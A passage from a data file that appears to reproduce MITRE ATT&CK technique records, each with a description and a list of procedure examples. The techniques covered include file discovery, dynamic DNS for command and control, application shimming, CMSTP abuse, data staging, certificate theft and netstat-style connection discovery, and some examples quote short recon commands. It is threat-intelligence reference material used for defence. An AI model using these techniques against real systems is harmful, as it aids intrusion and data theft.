a directory listing.', '[WINERACK] can enumerate files and directories.', '[Cardinal RAT] checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).', '[OwaAuth] has a command to list its directory and logical drives.', '[RARSTONE] obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.', '[Kivars] has the ability to list drives on the infected host.', '[BlackEnergy] gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry. [BlackEnergy] has searched for given file types.', '[NightClub] can use a file monitor to identify .lnk, .doc, .docx, .xls, .xslx, and .pdf files.', '[WannaCry] searches for variety of user files by file extension before encrypting them using RSA and AES, including Office, PDF, image, audio, video, source code, archive/compression format, and key and certificate files.', '[SoreFang] has the ability to list directories.', '[AutoIt backdoor] is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.', '[Caterpillar WebShell] can search for files in directories. ', '[Inception] used a file listing plugin to collect information about file and directories both on local and remote drives.', ""[USBferry] can detect the victim's file or folder list.\t"", '[Avaddon] has searched for specific files prior to encryption.', '[Rclone] can list files and directories with the `ls`, `lsd`, and `lsl` commands.', '[SideTwist] has the ability to search for specific files.', '[GrimAgent] has the ability to enumerate files and directories on a compromised host.', '[Skidmap] has checked for the existence of specific files including <code>/usr/sbin/setenforce</code> and <code> /etc/selinux/config</code>. It also has the ability to monitor the cryptocurrency miner file and process.  ', '[zwShell] can browse the file system.', '[ZxShell] has a command to open a file manager and explorer on the system. ', '[DropBook] can collect the names of all files and folders in the Program Files directories. ', '[TSCookie] has the ability to discover drive information on the infected host.', '[Kwampirs] collects a list of files and directories in C:\\ with the command <code>dir /s /a c:\\ >> ""C:\\windows\\TEMP\\[RANDOM].tmp""</code>.', '[Ninja] has the ability to enumerate directory content.', '[JPIN] can enumerate drives and their types. It can also change file permissions using cacls.exe.', '[ZLib] has the ability to enumerate files and drives.', '[FLASHFLOOD] searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.', '[Lokibot] can search for specific files on an infected host.', '[HOPLIGHT] has been observed enumerating system drives and partitions.\t', '[Chimera] has utilized multiple commands to identify data of interest in file and directory listings.', '[BadPatch] searches for files with specific file extensions.', ""[NETEAGLE] allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information."", '[SysUpdate] can search files on a compromised host.', '[BabyShark] has used <code>dir</code> to search for ""programfiles"" and ""appdata"".\t', '[admin@338] actors used the following commands after exploiting a machine with [LOWBALL] malware to obtain information about files and directories: <code>dir c:\\ >> %temp%\\download</code> <code>dir ""c:\\Documents and Settings"" >> %temp%\\download</code> <code>dir ""c:\\Program Files\\"" >> %temp%\\download</code> <code>dir d:\\ >> %temp%\\download</code>', '[MoonWind] has a command to return a directory listing for a specified directory.', '[Ke3chang] uses command-line interaction to search files and directories.', '[MegaCortex] can parse the available drives and directories to determine which files to encrypt. ', '[Pteranodon] identifies files matching certain file extension and copies them to subdirectories it created.', '[CookieMiner] has looked for files in the user\'s home directory with ""wallet"" in their name using <code>find</code>.', '[CrossRAT] can list all files on a system.', '[DEATHRANSOM] can use loop operations to enumerate directories on a compromised host.', '[InnaputRAT] enumerates directories and obtains file attributes on a system.', '[SUNBURST] had commands to enumerate files and directories.', '[Cuba] can enumerate files by using a variety of functions.', '[Linfo] creates a backdoor through which remote attackers can list contents of drives and search for files.', '[CosmicDuke] searches attached and mounted drives for file extensions and keywords that match a predefined list.', '[Sandworm Team] has enumerated files on a compromised host.', '[Kazuar] finds a specified directory, lists the files and metadata about those files.', '[XAgentOSX] contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory. [XAgentOSX] contains the showBackupIosFolder function to check for IOS device backups by running <code>ls -la ~/Library/Application\\ Support/MobileSync/Backup/</code>.', '[HermeticWiper] can enumerate common folders such as My Documents, Desktop, and AppData.', '[Cyclops Blink] can use the Linux API `statvfs` to enumerate the current working directory.', '[FIVEHANDS] has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.', '[Black Basta] can enumerate specific files for encryption.', '[Cobalt Strike] can explore files on a compromised system.', '[DarkWatchman] has the ability to enumerate file and folder names.', '[Industroyer] data wiper component enumerates specific files on all the Windows drives.', '[Brave Prince] gathers file and directory information from the victim’s machine.', '[OceanSalt] can extract drive information from the endpoint and search files on the system.', '[NETWIRE] has the ability to search for files on the compromised host.', '[Sidewinder] has used malware to collect information on files and directories.', '[TINYTYPHON] searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.', '[Octopus] can collect information on the Windows directory and searches for compressed RAR files on the host.', '[SUNSPOT] enumerated the Orion software Visual Studio solution directory path.', '[Zox] can enumerate files on a compromised host.', 'A variant of [Elise] executes <code>dir C:\\progra~1</code> when initially run.', '[Bisonal] can retrieve a file listing from the system. ', '[MiniDuke] can enumerate local drives.', '[Conti] can discover files on a local system.', '[SLOTHFULMEDIA] can enumerate files and directories.', '[ADVSTORESHELL] can list files and directories.', '[FinFisher] enumerates directories and scans for certain files.', '[Pcexter] has the ability to search for files in specified directories.', '[LoFiSe] can monitor the file system to identify files less than 6.4 MB in size with file extensions including .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pdf, .rtf, .tif, .odt, .ods, .odp, .eml, and .msg.', '[Avenger] has the ability to browse files in directories such as Program Files and the Desktop. ', '[COATHANGER] will survey the contents of system files during installation.', ""[CharmPower] can enumerate drives and list the contents of the C: drive on a victim's computer."", '[REvil] has the ability to identify specific files and directories that are not to be encrypted.', 'During the [SolarWinds Compromise] [APT29] obtained information about the configured Exchange virtual directory using `Get-WebServicesVirtualDirectory`.', '[Empire] includes various modules for finding files of interest on hosts and network shares.', '[Pupy] can walk through directories and recursively search for strings in files.', '[Scattered Spider] Spider enumerates a target organization for files and directories of interest, including source code.', '[Gelsemium] can retrieve data from specific Windows directories, as well as open random files as part of [Virtualization/Sandbox Evasion]', '[Aoqin Dragon] has run scripts to identify file formats including Microsoft Word.', '[Proxysvc] lists files in directories.', ""[Tropic Trooper] has monitored files' modified time.\t"", '[Dark Caracal] collected file listings of all default Windows directories.', '[GravityRAT] collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.', '[Bandook] has a command to list files on a system.', '[MuddyWater] has used malware that checked if the ProgramData folder had folders or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET.""', '[Trojan.Karagany] can enumerate files and directories on a compromised host.', '[PoshC2] can enumerate files on the local file system and includes a module for enumerating recently accessed files.', '[3PARA RAT] has a command to retrieve metadata for files on disk as well as a command to list the current working directory.', '[NotPetya] searches for files ending with dozens of different file extensions prior to encryption.', '[ThreatNeedle] can obtain file and directory information.', '[BoomBox] can search for specific files and directories on a machine.', '[Samurai] can use a specific module for file enumeration.', '[jRAT] can browse file systems.', '[Clop] has searched folders and subfolders for files to encrypt.', '[GoldenSpy] has included a program ""ExeProtector"", which monitors for the existence of [GoldenSpy] on the infected system and redownloads if necessary.\t', '[OutSteel] can search for specific file extensions, including zipped files.', '[FYAnti] can search the <code>C:\\Windows\\Microsoft.NET\\</code> directory for files of a specified size.', '[BADFLICK] has searched for files on the infected host.', '[CaddyWiper] can enumerate all files and directories on a compromised host.', '[Stuxnet] uses a driver to scan for specific filesystem driver objects.', 'An older version of [CHOPSTICK] has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.', '[Zebrocy] searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar. [Zebrocy] also runs the <code>echo %APPDATA%</code> command to list the contents of the directory. [Zebrocy] can obtain the current execution path as well as perform drive enumeration. ', '[AvosLocker] has searched for files and directories on a compromised network.', ""[Magic Hound] malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents."", '[PLEAD] has the ability to list drives and files on the compromised host.', '[Okrum] has used DriveLetterView to enumerate drive information.', '[ObliqueRAT] has the ability to recursively enumerate files on an infected endpoint.', '[BBSRAT] can list file and directory information.', '[StrongPity] can parse the hard drive on a compromised host to identify specific file extensions.', '[QuietSieve] can search files on the target host by extension, including doc, docx, xls, rtf, odt, txt, jpg, pdf, rar, zip, and 7z. ', '[ROKRAT] has the ability to gather a list of files and directories on the infected system.', '[TeamTNT] has used a script that checks `/proc/*/environ` for environment variables related to AWS.', '[HotCroissant] has the ability to retrieve a list of files in a given directory as well as drives and drive types.', '[Peppy] can identify specific files for exfiltration.', '[Psylo] has commands to enumerate all storage devices and to find all files that start with a particular string.', '[Doki] has resolved the path of a process PID to use as a script argument.', '[ZIPLINE] can find and append specific files on Ivanti Connect Secure VPNs based upon received commands.', '[Koadic] can obtain a list of directories.', '[BlackMould] has the ability to find files on the targeted system.', '[CreepyDrive] can specify the local file path to upload files from.', '[LuminousMoth] has used malware that scans for files in the Documents, Desktop, and Download folders and in other drives.', 'During [Operation Wocao] threat actors gathered a recursive directory listing to find files and directories of interest.', '[POWRUNER] may enumerate user directories on a victim.', '[KeyBoy] has a command to launch a file browser or explorer on the system.', '[Dtrack] can list files on available disk volumes.', '[BACKSPACE] allows adversaries to search for files.', '[DDKONG] lists files on the victim’s machine.', '[Denis] has several commands to search directories for files.', '[OSX/Shlayer] has used the command <code>appDir=""$(dirname $(dirname ""$currentDir""))""</code> and <code>$(dirname ""$(pwd -P)"")</code> to construct installation paths.', '[Heyoka Backdoor] has the ability to search the compromised host for files.', '[Forfiles] can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)', '[Cryptoistic] can scan a directory to identify files for deletion.', 'Some versions of [DarkGate] search for the hard-coded folder <code>C:\\Program Files\\e Carte Bleue</code>.', '[CORALDECK] searches for specified files.', '[HTTPBrowser] is capable of listing files, folders, and drives on a victim.', 'During [Operation Dream Job] [Lazarus Group] conducted word searches within documents on a compromised host in search of security and financial matters.', ""[ChChes] collects the victim's %TEMP% directory path and version of Internet Explorer."", '[APT3] has a tool that looks for files and directories on the local file system.', '[APT32] backdoor possesses the capability to list files and directories on a machine. \t ', '[Mustang Panda] has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files.', '[Pasam] creates a backdoor through which remote attackers can retrieve lists of files.', '[metaMain] can recursively enumerate files in an operator-provided directory.', '[RainyDay] can use a file exfiltration tool to collect recently changed files with specific extensions.', '[InvisiMole] can list information about files in a directory and recently opened or used documents. [InvisiMole] can also search for specific files by supplied file mask.', 'During [Night Dragon] threat actors used [zwShell] to establish full remote control of the connected machine and browse the victim file system.', '[Gold Dragon] lists the directories for Desktop, program files, and the user’s recently accessed files.', '[AppleSeed] has the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories.', '[CrackMapExec] can discover specified filetypes and log files on a targeted system.', '[FoggyWeb] loader can check for the [FoggyWeb] backdoor .pri file on a compromised AD FS server.', '[Cannon] can obtain victim drive information as well as a list of folders in C:\\Program Files.', '[KGH_SPY] can enumerate files and directories on a compromised host.', '[Mispadu] searches for various filesystem paths to determine what banking applications are installed on the victim’s machine.', '[WastedLocker] can enumerate files and directories just prior to encryption.', '[NDiskMonitor] can obtain a list of all files and directories as well as logical drives.', '[Ixeshe] can list file and directory information.', '[Backdoor.Oldrea] collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.', '[Derusbi] is capable of obtaining directory, file, and drive listings.', ' [Siloscape] searches for the Kubernetes config file and other related files using a regular expression. ', '[APT39] has used tools with the ability to search for files on a compromised host.', '[ToddyCat] has run scripts to enumerate recently modified documents having either a .pdf, .doc, .docx, .xls or .xlsx extension.', '[StrifeWater] can enumerate files on a compromised host.', '[MobileOrder] has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.', '[BLUELIGHT] can enumerate files and collect associated metadata.', '[ccf32] can parse collected files to identify specific file extensions.', '[Lazarus Group] malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.', '[SILENTTRINITY] has several modules, such as `ls.py`, `pwd.py`, and `recentFiles.py`, to enumerate directories and files. ', '[Darkhotel] has used malware that searched for files with specific patterns.', '[TajMahal] has the ability to index files from drives, user profiles, and removable drives.', '[Prestige] can traverse the file system to discover files to encrypt by identifying specific extensions defined in a hardcoded list.', '[SOUNDBITE] is capable of enumerating and manipulating files and directories.', '[RemoteUtilities] can enumerate files and directories on a target machine.', '[Hydraq] creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.', '[StreamEx] has the ability to enumerate drive types.', '[Taidoor] can search for specific files.', '[menuPass] has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.', '[BLINDINGCAN] can search, read, write, move, and execute files.', '[TrickBot] searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.', '[Remcos] can search for files on the infected machine.', '[Mafalda] can search for files and directories.', '[LookBack] can retrieve file listings from the victim machine.', '[Aria-body] has the ability to gather metadata from a file and to search for file and directory names.', '[Kasidet] has the ability to search for a given filename on a victim.', '[Kimsuky] has the ability to enumerate all files and directories on an infected system.', '[Ramsay] can collect directory and file lists.\t', 'The [IceApple] Directory Lister module can list information about files and directories including creation time, last write time, name, and size.', '[Action RAT] has the ability to collect drive and file information on an infected machine.', '[HAFNIUM] has searched file contents on a compromised host.', '[Rising Sun] can enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time. [Rising Sun] can enumerate the compilation timestamp of Windows executable files.\t', '[SPACESHIP] identifies files and directories for collection by searching for specific file extensions or file modification time.', '[Penquin] can use the command code <code>do_vslist</code> to send file names, size, and status to C2.', '[Machete] produces file listings in order to search for files to be exfiltrated.', '[RTM] can check for specific files and directories associated with virtualization and malware analysis.', 'A version of [KONNI] searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together.', '[RedLeaves] can enumerate and search for files and directories.', '[Confucius] has used a file stealer that checks the Document, Downloads, Desktop, and Picture folders for documents and images with specific extensions.', '[WarzoneRAT] can enumerate directories on a compromise host.', '[APT41] has executed <code>file /bin/pwd</code> on exploited victims, perhaps to return architecture related information.', '[Winnti Group] has used a program named ff.exe to search for specific documents on compromised hosts.', '[AcidRain] identifies specific files and directories in the Linux operating system associated with storage devices.', '[Saint Bot] can search a compromised host for specific files.', '[Nebulae] can list files and directories on a compromised host.', '[FruitFly] looks for specific files and file types.', '[XCSSET] has used `mdfind` to enumerate a list of apps known to grant screen sharing permissions.', '[Azorult] can recursively search for files in folders and collects files from the desktop with certain extensions.', '[PACEMAKER] can parse `/proc/""process_name""/cmdline` to look for the string `dswsd` within the command line.', '[Remexi] searches for files on the system. ', '[Windigo] has used a script to check for the presence of files created by OpenSSH backdoors.', '[SombRAT] can execute <code>enum</code> to enumerate files in storage on a compromised system.', '[Cheerscrypt] can search for log and VMware-related files with .log, .vmdk, .vmem, .vswp, and .vmsn extensions.', '[APT18] can list files information for specific directories.', 'A module in [Prikormka] collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.', '[Dacls] can scan directories on a compromised host.', '[Imminent Monitor] has a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there.', '[Zeus Panda] searches for specific directories on the victim’s machine.', '[Rover] automatically searches for files on local drives based on a predefined list of file extensions.', '[FatDuke] can enumerate directories on target machines.', '[ShimRat] can list directories.', '[Pisloader] has commands to list drives on the victim machine and to list file information for a given directory.', '[APT5] has used the BLOODMINE utility to discover files with .css, .jpg, .png, .gif, .ico, .js, and .jsp extensions in Pulse Secure Connect logs.', '[LITTLELAMB.WOOLTEA] can monitor for system upgrade events by checking for the presence of `/tmp/data/root/dev`.', '[Fox Kitten] has used WizTree to obtain network files and directory listings.', '[MacMa] can search for a specific file on the compromised computer and can enumerate files in Desktop, Downloads, and Documents folders.', '[Royal] can identify specific files and directories to exclude from the encryption process.', '[Metamorfo] has searched the Program Files directories for specific folders and has searched for strings related to its mutexes. ', '[SharpDisco] can identify recently opened files by using an LNK format parser to extract the original file path from LNK files found in either `%USERPROFILE%\\Recent` (Windows XP) or `%APPDATA%\\Microsoft\\Windows\\Recent` (newer Windows versions) .', '[BlackCat] can enumerate files for encryption.', '[Smoke Loader] recursively searches through directories for files.', ""[UPPERCUT] has the capability to gather the victim's current directory."", '[BADNEWS] identifies files with certain extensions from USB devices, then copies them to a predefined directory.', '[Leafminer] used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.', '[DustySky] scans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.', ""[FIN13] has used the Windows `dir` command to enumerate files and directories in a victim's network."", '[MESSAGETAP] checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.', ""[Turla] surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent. [Turla] RPC backdoors have also searched for files matching the <code>lPH*.dll</code> pattern."", '[Babuk] has the ability to enumerate files on a targeted system.', '[China Chopper] server component can list directory contents.', '[FunnyDream] can identify files with .doc, .docx, .ppt, .pptx, .xls, .xlsx, and .pdf extensions and specific timestamps for collection.', '[BRONZE BUTLER] has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.', '[Uroburos] can search for specific files on a compromised system.', '[TYPEFRAME] can search directories for files on the victim’s machine.', '[UNC2452] obtained information about the configured Exchange virtual directory using <code>Get-WebServicesVirtualDirectory</code>.', '[APT29] obtained information about the configured Exchange virtual directory using <code>Get-WebServicesVirtualDirectory</code>.', '[Operation Wocao] has gathered a recursive directory listing to find files and directories of interest.', '[Honeybee] service-based DLL implant traverses the FTP server’s directories looking for files with keyword matches for computer names or certain keywords.', '[Dust Storm] has used Android backdoors capable of enumerating specific files on the infected devices.', '[Dragonfly 2.0] used a batch script to gather folder and file names from victim hosts.', '[Shamoon] attempts to access the <code>ADMIN$</code>, <code>C$\\Windows</code>, <code>D$\\Windows</code>, and <code>E$\\Windows</code> shares on the victim with its current privileges.']",False
T1568,Dynamic Resolution,"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.  Adversaries may use dynamic resolution for the purpose of [Fallback Channels] When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.","['[Tomiris] has connected to a signalization server that provides a URL and port, and then [Tomiris] sends a GET request to that URL to establish C2.', '[Gelsemium] can use dynamic DNS domain names in C2.', 'For [Operation Spalax] the threat actors used dynamic DNS services, including Duck DNS and DNS Exit, as part of their C2 infrastructure.', '[TA2541] has used dynamic DNS services for C2 infrastructure.', '[Transparent Tribe] has used dynamic DNS services to set up C2.', '[BITTER] has used DDNS for C2 communications.', '[RTM] has resolved [Pony] C2 server IP addresses by either converting Bitcoin blockchain transaction data to specific octets, or accessing IP addresses directly within the Namecoin blockchain.', '[APT29] has used Dynamic DNS providers for their malware C2 infrastructure.', '[NETEAGLE] can use HTTP to download resources that contain an IP address and port number pair to connect to for C2.', 'During the [SolarWinds Compromise] [APT29] used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2. ', '[Maze] has forged POST strings with a random choice from a list of possibilities including ""forum"", ""php"", ""view"", etc. while making connection with the C2, hindering detection efforts.', '[AsyncRAT] can be configured to use dynamic DNS.', 'During [C0026] the threat actors re-registered a ClouDNS dynamic DNS subdomain which was previously used by [ANDROMEDA]', 'For [Operation Dust Storm] the threat actors used dynamic DNS domains from a variety of free providers, including No-IP, Oray, and 3322. ', '[Bisonal] has used a dynamic DNS service for C2.', '[Gamaredon Group] has incorporated dynamic DNS domains in its infrastructure.', 'During [Night Dragon] threat actors used dynamic DNS services for C2.', '[SUNBURST] dynamically resolved C2 infrastructure for randomly-generated subdomains within a parent domain.', '[APT29] used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.', '[UNC2452] used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.', '[Gelsemium] has used dynamic DNS in its C2 infrastructure.']",
T1138,Application Shimming,"The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.  Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses [Hooking] to redirect the code as necessary in order to communicate with the OS.   A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:  * <code>%WINDIR%\AppPatch\sysmain.sdb</code> * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>  Custom databases are stored in:  * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>  To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control] (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to [Hooking] utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.",[],True
T1647,Plist File Modification,"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.   Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window] or running additional commands for persistence (ex: [Launch Agent] Daemon] or [Re-opened Applications]  For example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application’s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking]","['[XCSSET] uses the <code>plutil</code> command to modify the <code>LSUIElement</code>, <code>DFBundleDisplayName</code>, and <code>CFBundleIdentifier</code> keys in the <code>/Contents/Info.plist</code> file to change how [XCSSET] is visible on the system.']",False
T1191,CMSTP,"The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.  Adversaries may supply CMSTP.exe with INF files infected with malicious commands.  Similar to [Regsvr32] / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs   and/or COM scriptlets (SCT) from remote servers.    This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.  CMSTP.exe can also be abused to [Bypass User Account Control] and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.   ",[],True
T1188,Multi-hop Proxy,"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.",[],True
T1074,Data Staged,"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data] Interactive command shells may be used, and common functionality within [cmd] and bash may be used to copy data into a staging location.  In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance] and stage data in that instance.  Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.","['[Wizard Spider] has collected and staged credentials and network enumeration information, using  the networkdll and psfin [TrickBot] modules.', '[Volt Typhoon] has staged collected data in password-protected archives.', '[Kobalos] can write captured SSH connection credentials to a file under the <code>/var/run</code> directory with a <code>.pid</code> extension for exfiltration. ', '[Kevin] can create directories to store logs and other collected data.', '[QUIETCANARY] has the ability to stage data prior to exfiltration.', '[Scattered Spider] stages data in a centralized database prior to exfiltration.', '[Shark] has stored information in folders named `U1` and `U2` prior to exfiltration.', 'stages collected data in a text file.']",False
T1649,Steal or Forge Authentication Certificates,"Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.  Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files), misplaced certificate files (i.e. [Unsecured Credentials] or directly from the Windows certificate store via various crypto APIs. With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.  Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement] Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation] by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence] via stealing or forging certificates that can be used as [Valid Accounts] for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.  Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence] by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates). Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket] ticket-granting tickets (TGT) or NTLM plaintext.","['[AADInternals] can create and export various authentication certificates, including those associated with Azure AD joined/registered devices.', '[APT29] has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates.', '[Mimikatz] `CRYPTO` module can create and export various types of authentication certificates.']",False
T1049,System Network Connections Discovery,"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.   An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.  Utilities and commands that acquire this information include [netstat] ""net use,"" and ""net session"" with [Net] In Mac and Linux, [netstat] and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to ""net session"". Additionally, built-in features native to network devices and [Network Device CLI] may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).","['[Lucifer] can identify the IP and port numbers for all remote connections from the compromised host.', '[Trojan.Karagany] can use [netstat] to collect a list of network connections.', '[Babuk] can use “WNetOpenEnumW” and “WNetEnumResourceW” to enumerate files in network resources for encryption.', '[APT38] installed a port monitoring tool, MAPMAKER, to print the active TCP connections on the local system.', '[menuPass] has used <code>net use</code> to conduct connectivity checks to machines.', '[ShimRatReporter] used the Windows function <code>GetExtendedUdpTable</code> to detect connected UDP endpoints.', '[Zebrocy] uses <code>netstat -aon</code> to gather network connection information.', '[PoshC2] contains an implementation of [netstat] to enumerate TCP and UDP connections.', '[Poseidon Group] obtains and saves information about victim network interfaces and addresses.', '[Remsec] can obtain a list of active connections and open ports.', 'During [Operation Wocao] threat actors collected a list of open connections on the infected system using `netstat` and checks whether it has an internet connection.', '[GravityRAT] uses the <code>netstat</code> command to find open ports on the victim’s machine.', '[netstat] can be used to enumerate local network connections, including active TCP connections and other network statistics.', ""[KONNI] has used <code>net session</code> on the victim's machine. "", '[TeamTNT] has run <code>netstat -anp</code> to search for rival malware connections. [TeamTNT] has also used `libprocesshider` to modify <code>/etc/ld.so.preload</code>.', ""[Andariel] has used the <code>netstat -naop tcp</code> command to display TCP connections on a victim's machine."", '[Mustang Panda] has used <code>netstat -ano</code> to determine network connection information.', '[CrackMapExec] can discover active sessions for a targeted system.', '[Maze] has used the ""WNetOpenEnumW"", ""WNetEnumResourceW”, “WNetCloseEnum” and “WNetAddConnection2W” functions to enumerate the network resources on the infected machine.', '[RATANKBA] uses <code>netstat -ano</code> to search for specific IP address ranges.', '[Turla] surveys a system upon check-in to discover active local network connections using the <code>netstat -an</code>, <code>net use</code>, <code>net file</code>, and <code>net session</code> commands. [Turla] RPC backdoors have also enumerated the IPv4 TCP connection table via the <code>GetTcpTable2</code> API call.', '[Carbon] uses the <code>netstat -r</code> and <code>netstat -an</code> commands.', '[Machete] uses the <code>netsh wlan show networks mode=bssid</code> and <code>netsh wlan show interfaces</code> commands to list all nearby WiFi networks and connected interfaces. ', '[Torisma] can use `WTSEnumerateSessionsW` to monitor remote desktop connections.', '[Cobalt Strike] can produce a sessions report from compromised hosts.', 'Commands such as <code>net use</code> and <code>net session</code> can be used in [Net] to gather information about network connections from a particular host.', '[APT3] has a tool that can enumerate current network connections.', '[BlackEnergy] has gathered information about local network connections using [netstat]', '[Dtrack] can collect network and active connection information.', ' [Volt Typhoon] has used `netstat -ano` on compromised hosts to enumerate network connections.                                                   ', ""[Sandworm Team] 